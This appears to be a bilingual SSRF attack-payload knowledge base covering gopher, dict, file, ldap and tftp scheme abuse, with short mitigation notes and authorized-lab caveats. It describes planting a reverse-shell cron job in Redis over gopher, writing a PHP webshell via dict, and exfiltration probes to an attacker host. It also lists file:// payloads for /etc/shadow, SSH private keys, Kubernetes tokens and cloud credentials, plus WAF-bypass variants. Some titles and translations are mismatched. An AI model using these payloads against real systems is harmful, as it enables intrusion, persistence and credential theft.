description.zh: 把 Redis 命令序列按 RESP 格式 URL 编码后拼入 gopher://127.0.0.1:6379/_ 提交；目标按命令执行即确认可伪造任意 TCP 交互报文。
description.en: URL-encode a Redis command sequence in RESP form and append it to gopher://127.0.0.1:6379/_; the target executing the commands proves arbitrary TCP traffic can be forged.

title.zh: 探测 ldap 与 tftp 外带通道
title.en: Probe ldap and tftp exfiltration channels

description.zh: 提交 ldap://{ATTACKER_HOST}/cn=test 与 tftp://{ATTACKER_HOST}/file；己方监听端收到连接或文件请求即建立非 HTTP 协议的数据外带通道。
description.en: Submit ldap://{ATTACKER_HOST}/cn=test and tftp://{ATTACKER_HOST}/file; a connection or file request hitting the listener establishes a non-HTTP exfiltration channel.

analysis.zh: SSRF 非 HTTP Scheme 边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Non-HTTP Scheme Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证取回器是否错误允许 file、dict、gopher 或 LDAP 等非业务协议连接受控夹具。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: file 协议读取本地文件
title.en: SSRF Non-HTTP Scheme Boundary Cleaned Command 1

description.zh: 逐条提交 file URI；返回对应文件内容即确认 file scheme 未被过滤。
description.en: Submit each file URI; returned file content confirms the file scheme is unfiltered.

title.zh: dict 探测内网缓存服务
title.en: SSRF Non-HTTP Scheme Boundary Cleaned Command 2

description.zh: 向回环 dict 端口发送探测命令；返回 Redis INFO 或 Memcached stats 文本即确认 dict scheme 可访问内网协议端口。
description.en: Send probe commands to loopback dict ports; returned Redis INFO or Memcached stats text confirms the dict scheme reaches internal protocol ports.

title.zh: gopher 构造 RESP 报文
title.en: SSRF Non-HTTP Scheme Boundary Cleaned Command 3

description.zh: 提交 gopher Redis 序列；监听器或 Redis 日志收到完整 RESP 帧，即确认 gopher 可构造任意 TCP 报文。
description.en: Submit the gopher Redis sequence; a complete RESP frame in listener or Redis logs confirms gopher can craft arbitrary TCP payloads.

explanation.en: Describes how the encoding segment "%0d%0a" participates in this validation command.

title.en: SSRF Non-HTTP Scheme Boundary Cleaned Command 4

description.zh: 对比 LDAP 指向回连主机与 127.0.0.1 的结果；回连主机收到 LDAP 连接即确认 ldap scheme 出网可用，内网返回差异即确认内网 LDAP 可探测。
description.en: Compare LDAP against the callback host and 127.0.0.1; an LDAP connection on the callback host confirms egress, and a differential internal response confirms intranet LDAP probing.

title.en: SSRF Non-HTTP Scheme Boundary Cleaned Command 5

description.zh: 提交 tftp URL；回连主机收到 TFTP 读请求即确认 tftp scheme 未被禁用。
description.en: Submit the tftp URL; a TFTP read request arriving on the callback host confirms the tftp scheme is not disabled.

description.zh: 以大小写混合形式提交各 scheme；标准小写被拦截而混合大小写仍被取回，即确认 scheme 校验存在大小写缺口。
description.en: Submit each scheme in mixed case; mixed-case succeeding while lowercase is blocked confirms a case-sensitivity gap in scheme checks.

name.zh: SSRF Gopher TCP 标记验证与保留攻击样例
name.en: SSRF Gopher TCP Marker Validation and Retained Attack Samples

description.zh: 覆盖 gopher:// 任意 TCP 报文构造的边界验证：从捕获器确认 TCP 标记链路，到 Redis cron 写入持久化，再到 MySQL 3306 与 FastCGI 9000 端口可达性核对及 HTTP 桥接请求。
description.en: Covers boundary validation of arbitrary TCP frame construction via gopher://: from capture-based confirmation of the TCP marker chain through Redis cron-write persistence to reachability checks on MySQL 3306 and FastCGI 9000 plus bridged HTTP requests.

prerequisites.zh: 确认 SSRF Gopher TCP 标记验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Gopher TCP Marker Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Gopher TCP 标记验证覆盖任意 TCP 报文构造场景：针对支持 gopher:// 的取回器，验证可控字节能否经服务端转发到指定端口。验证维度包含 TCP 标记链路确认、Redis cron 写入持久化、MySQL 与 FastCGI 端口可达性核对及 HTTP 桥接请求五类变体。
overview.en: SSRF Gopher TCP Marker Validation covers arbitrary TCP packet construction: for fetchers supporting gopher://, verify whether controlled bytes can be forwarded through the server to a chosen port. Verification dimensions include TCP marker-link confirmation, Redis cron-write persistence, MySQL and FastCGI port reachability checks, and HTTP bridging requests — five variants in all.

vulnerability.zh: 根因是 gopher scheme 把百分号解码后的字节不经协议解释直接写入 TCP 连接，使取回器退化为任意协议客户端；无认证的 Redis、MySQL、FastCGI 等内网服务边界被逐层跨越，最终可写入 cron 计划任务形成持久化。
vulnerability.en: The root cause is that the gopher scheme writes percent-decoded bytes to the TCP connection without any protocol interpretation, degrading the fetcher into an arbitrary protocol client; unauthenticated internal services such as Redis, MySQL, and FastCGI are crossed layer by layer, culminating in cron jobs that establish persistence.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步向隔离捕获器发送文本标记，收到命令行与结尾标记即确认 TCP 字节链路可用；第 2 步在书面授权的实验环境复现 gopher 封装的 Redis cron 写入，反弹连接到达监听端口即确认持久化；第 3、4 步用无副作用标记核对 MySQL 3306 与 FastCGI 9000 的端口可达性；第 5 步用 gopher 桥接 HTTP 请求读取 /admin。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 sends a text marker to an isolated catcher — receiving the command line and trailing marker proves the TCP byte path; step 2 replays the gopher-wrapped Redis cron write in a written-authorized lab, and a reverse connection reaching your listener confirms persistence; steps 3 and 4 verify MySQL 3306 and FastCGI 9000 port reachability with side-effect-free markers; step 5 bridges an HTTP request via gopher to read /admin. Replace placeholders via the global variables menu.

mitigation.zh: 在获取器入口拒绝 gopher 等非业务协议，解析后阻断内网与回环目标，网络层隔离 Redis、MySQL、FastCGI 等服务；Redis 启用认证与 ACL 并禁用危险命令。修复后用第 1 步样例回归，捕获器不应再收到来自应用的任何字节。
mitigation.en: Reject gopher and other non-business schemes at the fetcher entrance, block internal and loopback targets after resolution, and isolate Redis, MySQL, and FastCGI at the network layer; enable Redis authentication and ACLs and disable dangerous commands. After the fix, regress with the step 1 sample: the catcher must receive no further bytes from the application.

title.zh: 模板探测 gopher 通道
title.en: Probe the gopher channel with a template

description.zh: 把目标地址端口与命令填入 gopher://{TARGET}:{TARGET_PORT}/_{COMMAND} 模板提交；返回命令响应或目标服务指纹即 gopher 通道可用。
description.en: Fill target host, port and command into the gopher://{TARGET}:{TARGET_PORT}/_{COMMAND} template; a command response or service fingerprint confirms the gopher channel works.

title.zh: 双重编码绕过载荷过滤
title.en: Evade payload filters with double encoding

description.zh: 若 %0d%0a 等控制字符被 WAF 拦截，把载荷整体再编码为 %250d%250a 后重放；目标服务仍按原始命令执行即过滤被绕过。
description.en: If control characters like %0d%0a are blocked by the WAF, re-encode the payload to %250d%250a and replay; the service still executing the original commands means the filter is bypassed.

title.zh: 写入 Redis 计划任务反弹
title.en: Plant a reverse-shell cron in Redis

description.zh: 用第 1 步通道提交 flushall 后写入 */1 * * * * bash 反弹语句并落盘 crontab；监听端收到 shell 即获得目标系统命令执行权。
description.en: Over the channel from step 1, flushall then set the */1 * * * * bash reverse line and land it in crontab; a shell on the listener grants system-level code execution on the target.

description.zh: 向 {LAB_FASTCGI_HOST}:9000 发送 FCGI_GET_VALUES 探测报文；返回 FCGI_MAX_CONNS 等应答即确认 FastCGI 开放，可续发执行请求夺权。
description.en: Send an FCGI_GET_VALUES probe to {LAB_FASTCGI_HOST}:9000; FCGI_MAX_CONNS in the reply confirms FastCGI is open, ready for follow-up execution requests.

title.zh: 伪造内网 HTTP 请求

description.zh: 用 gopher 向目标 80 端口拼入 GET /admin 的完整 HTTP 报文；响应返回管理页内容即以服务端身份完成对受保护内网资源的访问。
description.en: Assemble a full GET /admin HTTP request into a gopher payload against port 80; admin page content in the response completes access to protected intranet resources as the server.

analysis.zh: SSRF Gopher TCP 标记验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Gopher TCP Marker Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 向隔离字节记录监听器发送无害文本标记，只证明原始 TCP 可达性，不执行后端命令。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

title.zh: gopher 转发任意 TCP 流量
title.en: SSRF Gopher TCP Marker Validation Cleaned Command 1

description.zh: 用目标主机与端口上的捕获器验证 gopher 任意 TCP 转发；捕获器收到 _COMMAND 行与结尾 _PAYLOADER_LAB 标记即确认 TCP 标记链路可用。
description.en: Validate arbitrary gopher TCP forwarding against a capture service on the target host and port; receiving the _COMMAND line and trailing _PAYLOADER_LAB marker confirms the TCP marker path.

explanation.zh: 由全局变量面板配置的隔离目标主机和端口
explanation.en: Isolated target host and port configured in global variables

explanation.zh: URL 编码的测试命令字段、CRLF 与唯一无害标记
explanation.en: URL-encoded test command field, CRLF, and unique harmless marker

description.zh: 提交 gopher 封装的 Redis cron 写入序列；注意 RESP 块长度 $57 必须按替换 {ATTACKER_IP} 与 {LPORT} 后的实际字节数重新计算，计划任务落地且反弹连接到达监听端口即确认持久化写入成功。
description.en: Submit the gopher-wrapped Redis cron-write sequence; the cron entry landing and a reverse connection arriving on the listener port confirm persistence.

explanation.zh: Gopher协议构造发往内网Redis的原始请求流
explanation.en: Gopher carries raw Redis request stream

explanation.zh: 写入的crontab值：每分钟反弹shell到4444端口
config set dir指向cron配置目录
explanation.en: RDB dump directory set to cron path
RDB filename set to root crontab

description.zh: 该授权实验 URL 只证明取回器能经 gopher 连接隔离的 3306 监听器并送达标记字节；MySQL 握手、认证和 SQL 执行属于后续独立阶段，必须分别取证。
description.en: Remove the nonexistent universal MySQL packet placeholder. This authorized-lab URL proves only that the fetcher can reach an isolated port 3306 listener; MySQL handshake, authentication, and SQL execution require separate evidence.

description.zh: 向隔离 FastCGI 监听器提交完整、无副作用的 GET_VALUES 管理帧；仅在监听器与服务日志核对帧解析结果，不发送 PHP 参数或执行脚本。
description.en: Replace the ellipsis placeholder with a complete side-effect-free FastCGI GET_VALUES management record. Validate record parsing and service logs only on an isolated listener without sending PHP parameters or executing a script.

title.zh: gopher 桥接 HTTP 请求
title.en: SSRF Gopher TCP Marker Validation Cleaned Command 5

description.zh: 向目标 80 端口提交 gopher 封装的 HTTP 请求；返回 /admin 响应且 Host 头为目标主机，即确认 gopher HTTP 桥接可用。
description.en: Submit a gopher-wrapped HTTP request to target port 80; a returned /admin response with the target Host header confirms gopher HTTP bridging.

title.zh: 双重 URL 编码绕过
title.en: SSRF Gopher TCP Marker Validation Cleaned Command 1

description.zh: 提交双重 URL 编码的 RESP 帧变体；捕获器解码后收到合法 RESP，即确认二次解码可绕过单层过滤。
description.en: Submit the double-URL-encoded RESP frame variant; a valid RESP after decoding on the capture service confirms double-decoding bypasses single-pass filtering.

description.zh: 绕过对 %0d%0a 完整 CRLF 特征的匹配：仅用 %0a 行结束同样构成 RESP 行；键值写入后 keys 可见即成功。
description.en: Use bare %0a line endings against full CRLF signatures while remaining valid RESP; the key being visible afterwards confirms success.

description.zh: 绕过对 gopher 协议的封锁：dict 协议冒号分词发送等价命令；Redis 端执行成功即成功。
description.en: Send equivalent commands via dict colon-tokenization when gopher is blocked; successful Redis-side execution confirms success.

description.zh: 绕过只解码一次的 gopher 深度检测：载荷二次编码，终端解码两次后还原为 RESP；命令生效即成功。
description.en: Double-encode the payload for gopher inspection that decodes once; the terminal decoding twice restores RESP and effective commands confirm success.

title.zh: 编码 Redis 帧的 Gopher URI
title.en: Gopher URI with an Encoded Redis Frame

description.zh: 只对隔离协议捕获器或专用测试 Redis 使用，并将帧替换为无状态只读命令；原行用于保留数据集语义。
description.en: Use only against an isolated protocol capture service or dedicated test Redis and replace the frame with a stateless read-only command; the original line is retained for dataset fidelity.

description.zh: 交互输入用户名/密码生成完整 gopher 登录载荷后，将输出整体再 URL 编码一次（% 替换为 %25）再投递；绕过握手包十六进制特征的串匹配，连接与认证交互出现即成功。
description.en: Double-encode the handshake fragment past hex signature matching while the wire protocol restores it; an appearing connection and auth exchange confirms success.

description.zh: 按提示输入目标与命令生成登录包，能力标志位与用户名字段可按需构造变体；服务端进入认证流程即变体绕过成功。
description.en: Vary capability flags and the username field to evade fixed-capture signatures; the server entering the auth flow confirms success.

title.zh: 协议头大小写与端口伪装

description.zh: 绕过小写协议与标准端口组合特征：大写协议头并尝试镜像端口；数据包到达 MySQL 服务即成功。
description.en: Uppercase the scheme and probe mirrored ports against lowercase-standard-port signatures; packets reaching the MySQL service confirm success.

title.zh: 截断 MySQL 数据包 URI

description.zh: 该行含 `...`，只能作为协议分类和端口字节转发探针；验证地址改为捕获器，禁止补全认证包或数据库命令。
description.en: The line contains an ellipsis and is only a protocol-classification and port-forwarding probe. Point it to a capture service and do not complete authentication packets or database commands.

description.zh: 绕过对 FastCGI 记录头字节特征的串匹配：记录整体二次编码后由服务端解码；9000 端口响应记录返回即成功。
description.en: Double-encode the record so its header bytes evade string matching until server-side decoding; a response record from port 9000 confirms success.

description.zh: 绕过对单条完整 FCGI 利用串的检测：在同一 gopher URL 内按序拼接 BEGIN_REQUEST、携带 SCRIPT_FILENAME 的 PARAMS、空 PARAMS 与空 STDIN 完整记录序列；服务端返回执行结果或 FastCGI 应答即成功。注意记录必须经同一连接送达，拆成多次请求代表多条连接，后续记录不会生效。
description.en: Deliver BEGIN_REQUEST and params separately against single-complete-signature detection; SCRIPT_FILENAME ultimately taking effect confirms success.

description.zh: 绕过对 gopher:// 前缀的字面匹配：分隔符百分号编码，解析后等价；FastCGI 服务收到记录即成功。
description.en: Percent-encode separators so the prefix evades literal matching while remaining equivalent; the FastCGI service receiving records confirms success.

title.zh: 截断 FastCGI 记录 URI

description.zh: 省略号表示记录不完整。只替换为隔离捕获器并验证固定头字节，不生成 FCGI_PARAMS/STDIN 或 PHP 脚本请求。
description.en: The ellipsis marks an incomplete record. Point only to an isolated capture service and verify header bytes; do not generate FCGI_PARAMS, STDIN, or a PHP script request.

name.zh: SSRF Dict Redis/Memcached 命令交互
name.en: SSRF Dict Redis and Memcached Interaction

description.zh: 覆盖 dict:// Scheme 端口边界验证：从端口探测命令回显，到 Redis info/keys 与 Memcached stats 交互，再到 dict 序列写入 Redis WebShell，确认 dict 协议可交互深度。
description.en: Covers port boundary validation for the dict:// scheme: from probe-command echo on ports through Redis info/keys and Memcached stats interaction to writing a Redis webshell via dict sequences, confirming how deep dict-protocol interaction can go.

prerequisites.zh: 确认 SSRF Dict Redis/Memcached 命令交互的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Dict Port-Boundary Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Dict 端口边界验证覆盖 dict:// 协议交互场景：针对允许 dict scheme 的注入点，验证服务端能否向指定端口发送协议命令并带回显。验证维度从通用端口探测，到 Redis info/keys、Memcached stats 交互，再到 dict 序列写入 Redis WebShell。
overview.en: SSRF Dict Port-Boundary Validation covers dict:// protocol interaction: for injection points allowing the dict scheme, verify whether the server can send protocol commands to a chosen port and carry the echo back. Verification dimensions span generic port probing, Redis info/keys and Memcached stats interaction, and a dict sequence writing a Redis WebShell.

vulnerability.zh: 根因是 dict scheme 将 URL 路径中的字符串按行发送到目标端口，等价于向内网服务注入协议命令；Redis、Memcached 等未认证服务接受这些命令后，可进一步组合 config set 与 save 把数据落盘为可执行脚本。
vulnerability.en: The root cause is that the dict scheme sends the URL path string line by line to the target port, equivalent to injecting protocol commands into an internal service; unauthenticated services such as Redis and Memcached accept them, and the commands can be chained with config set and save to persist arbitrary content as an executable script.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步向目标端口发送 dict 探测命令，捕获器收到命令行即确认端口边界；第 2 步对回环 6379 发送 info 与 keys，返回 Redis 信息即确认可交互；第 3 步对 11211 发送 stats 验证 Memcached；第 4 步按序执行 set、config set dir/dbfilename、save 序列，Web 根目录出现可解析的 shell.php 即确认写入成功。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 sends a dict probe command to the target port — the catcher receiving the command line confirms the port boundary; step 2 sends info and keys to loopback 6379 — a Redis reply confirms interactive access; step 3 sends stats to 11211 to verify Memcached; step 4 runs the set, config set dir/dbfilename, and save sequence in order — a parseable shell.php appearing in the web root confirms the write. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝 dict 等非业务协议并阻断内网端口访问；Redis 启用认证、ACL 并用 rename-command 禁用 CONFIG/SAVE，Memcached 限制监听范围。修复后用第 2、4 步样例回归，协议命令应被拒绝且不再有任何文件落盘。
mitigation.en: Reject dict and other non-business schemes in the fetcher and block internal port access; enable Redis authentication and ACLs, disable CONFIG/SAVE via rename-command, and constrain the Memcached listen scope. After the fix, regress with the step 2 and step 4 samples: protocol commands must be denied and no files written.

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

name.zh: SSRF File Scheme 本地文件读取
name.en: SSRF File Scheme Local File Read

description.zh: 覆盖 file:// Scheme 的本地文件读取验证：从 Linux 与 Windows 敏感文件，到 Web 配置与云环境凭据文件，再到 SSH 私钥读取，并附大小写混合变体，用于确认文件 Scheme 的暴露范围。
description.en: Covers local file read validation for the file:// scheme: from Linux and Windows sensitive files through web configuration and cloud credential files to SSH private-key reads, with case-mixing variants, confirming the exposure range of the file scheme.

prerequisites.zh: 确认 SSRF File Scheme 本地文件读取的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF File-Scheme Sandbox Read are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF File Scheme 沙箱读取覆盖本地文件读取场景：针对支持 file:// 的取回功能，验证文件 scheme 能否越过网络取回边界。验证维度按 Linux 与 Windows 敏感文件、Web 应用配置、云环境凭据与 SSH 私钥五组路径展开，并附大小写混合变体。
overview.en: SSRF File-Scheme Sandbox Read covers local file reading: for fetch functions supporting file://, verify whether the file scheme crosses the network-fetch boundary. Verification dimensions unfold across five path groups — Linux and Windows sensitive files, web application configs, cloud credential files, and SSH keys — with mixed-case variants included.

vulnerability.zh: 根因是 URL 获取器未限制 scheme，file 协议绕过网络边界直接交由本地文件系统处理器承接，可读范围取决于应用进程权限；/etc/passwd、win.ini、.env、云平台凭据与 SSH 私钥等高价值文件因此全部进入暴露面。
vulnerability.en: The root cause is an unrestricted scheme in the URL fetcher: file bypasses the network boundary and is handled directly by the local filesystem processor, with readable scope bounded only by the application process's privileges; high-value files such as /etc/passwd, win.ini, .env, cloud credentials, and SSH private keys therefore all enter the exposure surface.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取 Linux 侧 /etc/passwd、/proc/self/environ 等文件，返回内容即确认 file 可读；第 2 步读取 Windows 侧 win.ini 与 SAM；第 3 步读取 config.php、.env 获取数据库连接串与应用密钥；第 4 步读取 Kubernetes serviceaccount token 与 AWS credentials；第 5 步读取 SSH 私钥，出现 OPENSSH PRIVATE KEY 即确认可窃取。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads Linux-side files such as /etc/passwd and /proc/self/environ — returned content confirms file reads; step 2 reads Windows-side win.ini and the SAM hive; step 3 reads config.php and .env for database connection strings and app secrets; step 4 reads the Kubernetes serviceaccount token and AWS credentials; step 5 reads SSH private keys — OPENSSH PRIVATE KEY content confirms theft. Replace placeholders via the global variables menu.

mitigation.zh: 获取器只允许 http/https 并显式拒绝 file 协议，文件功能改用对象 ID 与固定根目录定位；按最小权限运行应用进程，并把网络获取与本地文件读取拆分到不同服务身份。修复后用第 1 步样例回归，file URI 应在入口即被拒绝。
mitigation.en: Allow only http/https in the fetcher and explicitly reject the file protocol; locate file functionality by object ID within a fixed root; run the application process with least privilege and split network fetching from local file reads into separate service identities. After the fix, regress with the step 1 sample: file URIs must be rejected at the entrance.

description.zh: 提交 file:///etc/passwd 与 file:///c:/windows/win.ini；响应回显账户列表或 ini 段落即确认 file 协议可用且跨平台可读。
description.en: Submit file:///etc/passwd and file:///c:/windows/win.ini; echoed account lists or ini sections confirm the file scheme works across platforms.

attackChain.payload:
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline

description.zh: 若 file scheme 被拦截，改用 FILE:///ETC/PASSWD 等大小写变体重放；仍返回文件内容即表明过滤未做归一化处理。
description.en: If the file scheme is blocked, replay with case variants like FILE:///ETC/PASSWD; file content still returned shows no normalization is applied.

title.zh: 读取应用配置拿数据库口令
title.en: Read app configs for database secrets

description.zh: 用 file:///var/www/html/config.php 读取应用配置；内容中出现数据库连接串或 API 密钥即获得内网数据库的直连凭据。
description.en: Read file:///var/www/html/config.php; a database connection string or API key inside yields direct credentials for the internal database.

title.zh: 窃取 K8s 服务账号令牌
title.en: Steal the Kubernetes service account token

description.zh: 读取 file:///var/run/secrets/kubernetes.io/serviceaccount/token；拿到 JWT 令牌后可尝试调用 API Server，可执行的操作取决于该服务账号的 RBAC 授权，高权限账号才可能进一步接管集群资源。
description.en: Read file:///var/run/secrets/kubernetes.io/serviceaccount/token; the JWT lets you call the API Server and take over cluster resources.

title.zh: 窃取 SSH 私钥横向登录
title.en: Lift SSH keys for lateral login

description.zh: 读取 file:///home/user/.ssh/id_rsa；保存私钥后直连目标主机，并尝试同网段密钥复用完成横向移动。
description.en: Read file:///home/user/.ssh/id_rsa; save the key, SSH into the host directly, and try key reuse across the segment for lateral movement.

analysis.zh: SSRF File Scheme 沙箱读取只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF File-Scheme Sandbox Read is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只读取专用沙箱中的固定标记文件，验证 file scheme 是否越过应用允许的网络取回边界。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

execution.command:
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline

description.zh: 逐条读取 Linux 敏感文件；返回对应文件内容即确认 file scheme 可读且路径未被过滤。
description.en: Read each sensitive Linux file; returned content confirms the file scheme is readable and paths are unfiltered.

description.zh: 逐条读取 Windows 敏感文件；返回 win.ini、SAM 或私钥内容即确认 Windows 路径可读。
description.en: Read each sensitive Windows file; returned win.ini, SAM, or key content confirms Windows paths are readable.

explanation.zh: 读取Windows系统配置文件验证file协议可用
explanation.en: Read win.ini to verify file wrapper

explanation.zh: SAM账户数据库(运行中通常被锁定)

description.zh: 逐条读取 Web 应用配置；返回数据库连接串或应用密钥即确认配置文件可被窃取。
description.en: Read each web-application configuration file; returned connection strings or application secrets confirm configuration theft.

explanation.zh: 环境变量文件：常含密钥与凭据

description.zh: 逐条读取云环境凭据文件；返回 serviceaccount token 或 AWS credentials 即确认云凭据可被窃取。
description.en: Read each cloud-credential file; a returned serviceaccount token or AWS credentials file confirms cloud-credential theft.

description.zh: 逐条读取 SSH 私钥路径；返回 OPENSSH PRIVATE KEY 内容即确认私钥可被窃取。
description.en: Read each SSH private-key path; returned OPENSSH PRIVATE KEY content confirms private-key theft.

explanation.zh: 公钥文件：可读则掌握可登录账户

description.zh: 以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。
description.en: Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap.

description.zh: 绕过仅匹配 file:/// 三斜杠特征的规则：插入 localhost 主机段语法等价；文件内容返回即成功。
description.en: Insert the localhost host segment for an equivalent URI that defeats bare file:/// matching; returned file content confirms success.

description.zh: 绕过对标准三斜杠形式的正则匹配：多斜杠冗余仍解析为绝对路径；读取成功即成功。
description.en: Add redundant slashes that still resolve to the absolute path, evading canonical-form regexes; a successful read confirms success.

description.zh: 绕过对 file 协议黑名单：Java 场景下 netdoc 等价读文件；返回 passwd 内容即成功。
description.en: Use the Java-equivalent netdoc scheme against file-protocol blacklists; returned passwd content confirms success.

title.zh: 跨平台 File URI 目标

wafBypass.command:
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/version
file:///var/log/apache2/access.log
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM

description.zh: 原始路径只用于审计追溯。执行前按操作系统改写到隔离标记文件，每次只提交一个 file URI。
description.en: The original paths are retained only for audit traceability. Before execution, rewrite them to an isolated marker file for the relevant operating system and submit one file URI at a time.

description.zh: 绕过对 file:/// 明文前缀的匹配：分隔符编码后由应用解码；文件内容返回即成功。
description.en: Encode separators so the plaintext prefix disappears until application decoding; returned file content confirms success.

description.zh: 绕过对 URI 协议头的统一过滤：不携带协议直接穿越路径；目标文件内容回显即成功。
description.en: Traverse without any scheme header to bypass protocol-based filtering entirely; echoed target file content confirms success.

description.zh: 绕过对完整长文件名的特征匹配：使用 8.3 短名等价路径；读取内容一致即成功。
description.en: Use equivalent 8.3 short paths against full-name signature matching; identical content being read confirms success.

title.zh: 本地资源 URI 样例

description.zh: 按服务端操作系统和 URL 库选择对应行，并把真实系统文件替换为隔离标记；不同协议逐条测试。
description.en: Select the line matching the server OS and URL library, replace real system files with an isolated marker, and test schemes individually.

name.zh: SSRF 地址规范化回归

description.zh: 覆盖 SSRF 过滤的地址规范化缺口验证：从八进制/整数/十六进制 IP 变体与 IPv6 回环，到 URL 解析歧义与开放重定向链，再到通配 DNS 与编码/CRLF 变体，逐项确认过滤绕过是否成立。
description.en: Covers address-normalization gap validation for SSRF filters: from octal/integer/hex IP variants and IPv6 loopbacks through URL parsing ambiguity and open-redirect chains to wildcard DNS and encoding/CRLF variants, confirming item by item whether filter bypasses hold.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 确认 SSRF 地址规范化回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Address Canonicalization Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 地址规范化回归覆盖过滤绕过场景：针对带黑名单或白名单校验的取回功能，验证等价地址表示能否绕过检查命中回环。验证维度涵盖八进制/整数/十六进制与缩写 IP、IPv6 回环、URL 解析歧义、开放重定向、通配 DNS 与编码/CRLF 变体六组。
overview.en: SSRF Address Canonicalization Regression covers filter-bypass scenarios: for fetch functions with blacklist or whitelist checks, verify whether equivalent address representations slip past validation to reach loopback. Verification dimensions span six groups — octal/integer/hex and abbreviated IPs, IPv6 loopback, URL parsing ambiguities, open redirects, wildcard DNS, and encoding/CRLF variants.

